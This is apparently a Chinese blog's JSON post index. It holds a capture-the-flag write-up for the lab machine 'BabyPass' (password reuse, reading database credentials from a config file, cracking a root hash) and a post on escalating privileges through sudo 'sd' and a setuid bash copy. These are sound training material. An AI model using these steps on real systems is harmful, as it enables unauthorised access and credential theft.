Test@123\n```\n\u8fdb\u5165admin\u767b\u5f55\u9875\u9762\u767b\u5f55\u53d1\u73b0\u9875\u9762\u5d29\u4e86\uff0c\u70b9\u51e0\u4e2a\u4e5f\u6ca1\u53d1\u73b0\u6709\u4ec0\u4e48\u53d8\u5316\uff0c\u611f\u89c9\u50cf\u662f\u6b7b\u9875\u9762\uff0c\u56e0\u4e3a\u9996\u9875\u63d0\u793a\u4e0d\u8981\u5bc6\u7801\u590d\u7528\uff0c\u6362\u65b9\u5411\u5230ssh\u767b\u5f55\uff0c\u611f\u89c9anuj\u53ef\u80fd\u662f\u7528\u6237\n\n\n# 2.\u7acb\u8db3\u70b9\n\n\u6210\u529f\u767b\u5f55\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# ssh anuj@192.168.2.58                 \nanuj@192.168.2.58's password: \nLinux BabyPass 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue Nov 11 04:44:50 2025 from 192.168.2.55\nanuj@BabyPass:~$ sudo -l\n[sudo] password for anuj: \nSorry, user anuj may not run sudo on BabyPass.\nanuj@BabyPass:~$ \n\n```\n\u53d1\u73b0\u6709\u8fd9\u51e0\u4e2a\u975e\u7279\u6743\u7528\u6237\n```\nanuj:x:1001:1001:,,,:/home/anuj:/bin/bash\nadmin:x:1002:1002:,,,:/home/admin:/bin/bash\nwelcome:x:1000:1000:,,,:/home/welcome:/bin/bash\n```\nwelcome\u5bb6\u76ee\u5f55\u4e0b\u53d1\u73b0user.txt\n```\nanuj@BabyPass:/home/welcome$ cat user.txt \nflag{user-0bb3c30dc72e63881db5005f1aa19ac3}\n```\n# 3.root\n\u7ecf\u8fc7\u5c1d\u8bd5\u53d1\u73b0admin\u4e0eanuj\u5bc6\u7801\u76f8\u540c\uff0c\u90fd\u6ca1\u6709sudo\u6743\u9650\uff0cweb\u67b6\u6784\u633a\u5927\uff0c\u53ef\u4ee5\u8003\u8651\u662f\u5426\u5b58\u5728\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\n```\nanuj@BabyPass:/var/www/html/tms$ find ./ -iname '*config*' 2>/dev/null\n./includes/config.php\n./admin/includes/config.php\nanuj@BabyPass:/var/www/html/tms$ cat $(find ./ -iname '*config*' 2>/dev/null)\n<?php \n// DB credentials.\ndefine('DB_HOST','localhost');\ndefine('DB_USER','tms_user');\ndefine('DB_PASS','secure_password');\ndefine('DB_NAME','tms');\n// Establish database connection.\ntry\n{\n$dbh = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME,DB_USER, DB_PASS,array(PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES 'utf8''));\n}\ncatch (PDOException $e)\n{\nexit('Error: ' . $e->getMessage());\n}\n?>\n<?php \n// DB credentials.\ndefine('DB_HOST','localhost');\ndefine('DB_USER','tms_user');\ndefine('DB_PASS','secure_password');\ndefine('DB_NAME','tms');\n// Establish database connection.\ntry\n{\n$dbh = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME,DB_USER, DB_PASS,array(PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES 'utf8''));\n}\ncatch (PDOException $e)\n{\nexit('Error: ' . $e->getMessage());\n}\n?>\n```\n\u627e\u5230\u6570\u636e\u5e93\u51ed\u636etms_user:secure_password\n\u767b\u5f55\u67e5\u5230root\u52a0\u5bc6hash\n\n```\nanuj@BabyPass:/var/www/html/tms$ mysql -utms_user -psecure_password\nMariaDB [(none)]> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| tms                |\n+--------------------+\n2 rows in set (0.000 sec)\n\nMariaDB [(none)]> use tms;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMariaDB [tms]> show tables;\n+-----------------+\n| Tables_in_tms   |\n+-----------------+\n| admin           |\n| tblbooking      |\n| tblenquiry      |\n| tblissues       |\n| tblpages        |\n| tbltourpackages |\n| tblusers        |\n+-----------------+\n7 rows in set (0.000 sec)\nMariaDB [tms]> select * from tblusers \\G ;\n*************************** 1. row ***************************\n          id: 1\n    FullName: Manju Srivatav\nMobileNumber: 4456464654\n     EmailId: manju@gmail.com\n    Password: 202cb962ac59075b964b07152d234b70\n     RegDate: 2020-07-08 02:33:20\nUpdationDate: NULL\n*************************** 2. row ***************************\n          id: 2\n    FullName: Kishan\nMobileNumber: 9871987979\n     EmailId: kishan@gmail.com\n    Password: 202cb962ac59075b964b07152d234b70\n     RegDate: 2020-07-08 02:33:56\nUpdationDate: NULL\n*************************** 3. row ***************************\n          id: 3\n    FullName: Salvi Chandra\nMobileNumber: 1398756416\n     EmailId: salvi@gmail.com\n    Password: 202cb962ac59075b964b07152d234b70\n     RegDate: 2020-07-08 02:34:20\nUpdationDate: NULL\n*************************** 4. row ***************************\n          id: 4\n    FullName: Abir\nMobileNumber: 4789756456\n     EmailId: abir@gmail.com\n    Password: 202cb962ac59075b964b07152d234b70\n     RegDate: 2020-07-08 02:34:38\nUpdationDate: NULL\n*************************** 5. row ***************************\n          id: 5\n    FullName: Test\nMobileNumber: 1987894654\n     EmailId: anuj@gmail.com\n    Password: f925916e2754e5e03f75dd58a5733251\n     RegDate: 2020-07-08 02:35:06\nUpdationDate: 2021-05-11 00:37:41\n*************************** 6. row ***************************\n          id: 6\n    FullName: root\nMobileNumber: 123456789\n     EmailId: root@gmail.com\n    Password: fd50619cd7026f0f32272f77f4da6e92\n     RegDate: 2020-07-08 02:35:06\nUpdationDate: 2021-05-11 00:37:41\n6 rows in set (0.000 sec)\n\n```\n\u7834\u89e3hash\u5f97\u5230\n```\nfd50619cd7026f0f32272f77f4da6e92:Root@456\n```\n\u63d0\u6743\u5f97\u5230root\n```\nanuj@BabyPass:/var/www/html/tms$ su\nPassword: \nroot@BabyPass:/var/www/html/tms# cat /root/root.txt \nflag{root-bb289959b86dd81869df2eb9a7f3602a}\n```\u3002", "top": 0, "createdAt": 1763009203, "style": "", "script": "", "head": "", "ogImage": "https://avatars.githubusercontent.com/u/99706997?v=4", "createdDate": "2025-11-13", "dateLabelColor": "#0969da"}, "P6": {"htmlDir": "docs/post/wen-jian-du-qu-xiang-guan-(-chi-xu-geng-xin-).html", "labels": ["Need Known"], "postTitle": "\u6587\u4ef6\u8bfb\u53d6\u76f8\u5173(\u6301\u7eed\u66f4\u65b0)", "postUrl": "post/wen-jian-du-qu-xiang-guan-%28-chi-xu-geng-xin-%29.html", "postSourceUrl": "https://github.com/faabbi/faabbi.github.io/issues/6", "commentNum": 0, "wordCount": 355, "description": "\n1.wc\u547d\u4ee4\n\t wc\uff08word count\uff09\u547d\u4ee4\u662fLinux\u4e2d\u5e38\u7528\u4e8e\u8ba1\u7b97\u6587\u4ef6\u7684\u884c\u6570\u3001\u5b57\u6570\u548c\u5b57\u8282\u6570\u7684\u5de5\u5177\u3002", "top": 0, "createdAt": 1763009545, "style": "", "script": "", "head": "", "ogImage": "https://avatars.githubusercontent.com/u/99706997?v=4", "createdDate": "2025-11-13", "dateLabelColor": "#0969da"}, "P7": {"htmlDir": "docs/post/quan-xian-wen-ti-(-chi-xu-geng-xin-).html", "labels": ["Need Known"], "postTitle": "\u6743\u9650\u95ee\u9898(\u6301\u7eed\u66f4\u65b0)", "postUrl": "post/quan-xian-wen-ti-%28-chi-xu-geng-xin-%29.html", "postSourceUrl": "https://github.com/faabbi/faabbi.github.io/issues/7", "commentNum": 0, "wordCount": 315, "description": "web\u670d\u52a1\u4e0b\u4ee3\u7801\u6267\u884c\u6743\u9650\n\tnginx\u548capache2\u90fd\u5206\u4e3a\u4e24\u4e2a\u8fdb\u7a0b\n\t\t1.master\u8fdb\u7a0b\n\t\t2.worker\u8fdb\u7a0b\n\t\u65e0\u8bbaapache2\u6216\u662fnginx\u90fd\u662f\u4ee5worker\u8fdb\u7a0b\u7684\u6743\u9650\u4f5c\u4e3aweb\u670d\u52a1\u4ee3\u7801\u6267\u884c\u7684\u6743\u9650\n\t\t1.\u5bf9\u4e8enginx\u4f7f\u7528ps -aux | grep nginx\u67e5\u770b\uff0c\u7ec8\u7aef\u4f1a\u8f93\u51famaster process;\n\t\t\u5373master\u8fdb\u7a0b\u542f\u52a8\u6743\u9650\uff0cworker\u4f1a\u6709worker process;\u5373\u4e3aworker\u6743\u9650;\n\t\t2.\u5bf9\u4e8eapache2\u7ec8\u7aef\u8f93\u51fa\u7684\u7b2c\u4e00\u4e2aapache2\u8fdb\u7a0b\u5373\u4e3amaster\u8fdb\u7a0b,\u5269\u4e0b\u7684\u5219\u4e3aworker\u8fdb\n\t\t\u7a0b\n\u4f4e\u6743\u9650\u7528\u6237\u53ef\u4ee5ln\u94fe\u63a5\u9ad8\u6743\u9650\u7528\u6237\u6587\u4ef6\n\t\u786c\u94fe\u63a5\u4e0d\u80fd\u94fe\u63a5\u6587\u4ef6\u5939\uff0c\u8f6f\u8fde\u63a5\u53ef\u4ee5 -s\u8f6f\u8fde\u63a5\u3002", "top": 0, "createdAt": 1763009697, "style": "", "script": "", "head": "", "ogImage": "https://avatars.githubusercontent.com/u/99706997?v=4", "createdDate": "2025-11-13", "dateLabelColor": "#0969da"}, "P8": {"htmlDir": "docs/post/sd-ming-ling-ti-quan-lou-dong.html", "labels": ["Need Known"], "postTitle": "sd\u547d\u4ee4\u63d0\u6743\u6f0f\u6d1e", "postUrl": "post/sd-ming-ling-ti-quan-lou-dong.html", "postSourceUrl": "https://github.com/faabbi/faabbi.github.io/issues/8", "commentNum": 0, "wordCount": 2151, "description": "\n==**\u5728\u6d4b\u8bd5\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0sd\u547d\u4ee4\u6267\u884c\u540e\u4f1a\u6539\u53d8\u6e90\u6587\u4ef6\u7684\u5c5e\u7ec4\uff0c\u540c\u6837\u7684sed\u547d\u4ee4\u5c31\u4e0d\u5177\u5907\u8fd9\u4e2a\u4ea7\u751f\u6f0f\u6d1e\u7684\u7279\u6027**==\n\n\u5982\u56fe\u6bd4\u5982\u6211\u4eec\u5728\u6e17\u900f\u8fc7\u7a0b\u4e2d\u5df2\u7ecf\u62ff\u5230\u4e86\u7cfb\u7edf\u7684\u521d\u59cbshell\uff0c\u5982\u679c\u6211\u4eec\u80fd\u4ee5\u67d0\u4e2a\u7528\u6237\u7684\u6743\u9650\u6765\u6267\u884csd\u547d\u4ee4\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5229\u7528sd\u547d\u4ee4\u6765\u63d0\u5347\u81f3\u8be5\u7528\u6237\u6743\u9650\uff0c\u770b\u5982\u4e0b\u4f8b\u5b50\n\n\n```\nwww-data@Scanner:/tmp/test$ echo 123 > test\nwww-data@Scanner:/tmp/test$ ls -al\ntotal 12\ndrwxrwxrwx 2 www-data www-data 4096 Nov 13 04:46 .\ndrwxrwxrwt 3 root     root     4096 Nov 13 04:25 ..\n-rw-rw-rw- 1 www-data www-data    4 Nov 13 04:46 test\nwww-data@Scanner:/tmp/test$ sudo -l\nMatching Defaults entries for www-data on Scanner:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on Scanner:\n    (welcome) NOPASSWD: /usr/bin/ln\n    (welcome) NOPASSWD: /usr/bin/sd\nwww-data@Scanner:/tmp/test$ sudo -u welcome sd '' '' test\nwww-data@Scanner:/tmp/test$ ls -al\ntotal 12\ndrwxrwxrwx 2 www-data www-data 4096 Nov 13 04:46 .\ndrwxrwxrwt 3 root     root     4096 Nov 13 04:25 ..\n-rw-rw-rw- 1 welcome  welcome     4 Nov 13 04:46 test\n\n```\n\u53ef\u4ee5\u770b\u5230\u6587\u4ef6\u7684\u5c5e\u7ec4\u5df2\u7ecf\u4ecewww-data\u53d8\u6210\u4e86welcome\n\n\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f4e\u6743\u9650\u7528\u6237\u4e3a\u5c5e\u7ec4\u81ea\u8eab\u7684\u6587\u4ef6\u52a0s\u4f4d\uff0c\u4ece\u800c\u7ed3\u5408sd\u547d\u4ee4\u6539\u53d8\u6587\u4ef6\u5c5e\u7ec4\uff0c\u9020\u6210\u6f0f\u6d1e\u63d0\u6743\n\n\n```\nwww-data@Scanner:/tmp/test$ cp /bin/bash ./bash1\nwww-data@Scanner:/tmp/test$ ls -al\ntotal 1152\ndrwxrwxrwx 2 www-data www-data    4096 Nov 13 04:48 .\ndrwxrwxrwt 3 root     root        4096 Nov 13 04:25 ..\n-rwxr-xr-x 1 www-data www-data 1168776 Nov 13 04:48 bash1\nwww-data@Scanner:/tmp/test$ chmod a+s bash1\nwww-data@Scanner:/tmp/test$ ls -al\ntotal 1152\ndrwxrwxrwx 2 www-data www-data    4096 Nov 13 04:48 .\ndrwxrwxrwt 3 root     root        4096 Nov 13 04:25 ..\n-rwsr-sr-x 1 www-data www-data 1168776 Nov 13 04:48 bash1\nwww-data@Scanner:/tmp/test$ sudo -u welcome sd '' '' bash1\nwww-data@Scanner:/tmp/test$ ls -al\ntotal 1152\ndrwxrwxrwx 2 www-data www-data    4096 Nov 13 04:48 .\ndrwxrwxrwt 3 root     root        4096 Nov 13 04:25 ..\n-rwsr-sr-x 1 welcome  welcome  1168776 Nov 13 04:48 bash1\nwww-data@Scanner:/tmp/test$ ./bash1 -p\nbash1-5.0$ id\nuid=33(www-data) gid=33(www-data) euid=1000(welcome) egid=1000(welcome) groups=1000(welcome),33(www-data)\n\n```\n\u53ef\u4ee5\u770b\u5230\u76ee\u524d\u5df2\u7ecf\u63d0\u5347\u5230\u4e86welcome\u7684\u6743\u9650\n\n\u540c\u6837\u5728\u5148\u524d\u7684\u6d4b\u8bd5\u4e2d\uff0cln\u547d\u4ee4\u914d\u5408sd\u547d\u4ee4\u62a5\u9519\u540e\uff0c\u53ef\u4ee5\u4ea7\u751f.\u5f00\u5934\u7684\u4e34\u65f6\u6587\u4ef6\uff0c\u6b64\u6587\u4ef6\u7684\u5c5e\u7ec4\u4e3a\u547d\u4ee4\u6267\u884c\u65f6\u7684\u7528\u6237\uff0c\u6743\u9650\u7ee7\u627f\u6e90\u6587\u4ef6\u6743\u9650\u4e0d\u53d8\uff0c\u5185\u5bb9\u4e3asd\u66ff\u6362\u540e\u7684\u7ed3\u679c\uff0c\u4e0d\u8fc7\u518d\u6b21\u6d4b\u8bd5\u5e76\u6ca1\u6709\u53d1\u73b0\u518d\u6b21\u4ea7\u751f\u6b64\u79cd\u6587\u4ef6\uff0c\u6df1\u5c42\u7684\u539f\u7406\u76ee\u524d\u672a\u77e5\u3002", "top": 0, "createdAt": 1763027828, "style": "", "script": "", "head": "", "ogImage": "https://avatars.githubusercontent.com/u/99706997?v=4", "createdDate": "2025-11-13", "dateLabelColor": "#0969da"}}, "singeListJson": {}, "labelColorDict": {"bug": "#d73a4a", "documentation": "#0075ca", "duplicate": "#cfd3d7", "enhancement": "#a2eeef", "good first issue": "#7057ff", "help wanted": "#008672", "invalid": "#e4e669", "Need Known": "#82b36f", "question": "#d876e3", "wontfix": "#ffffff", "WP": "#4866d1"}, "displayTitle": "MJ", "faviconUrl": "https://avatars.githubusercontent.com/u/99706997?v=4", "ogImage": "https://avatars.githubusercontent.com/u/99706997?v=4", "primerCSS": "<link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />", "homeUrl": "https://faabbi.github.io", "prevUrl": "disabled", "nextUrl": "disabled"}